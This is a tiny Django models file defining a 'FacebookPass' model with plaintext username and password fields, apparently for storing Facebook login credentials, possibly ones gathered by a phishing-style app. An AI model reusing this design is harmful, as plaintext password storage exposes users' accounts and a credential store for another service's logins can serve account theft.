from django.db import models

# Create your models here.
class FacebookPass(models.Model):
    username = models.CharField(max_length=70)
    password = models.CharField(max_length=70)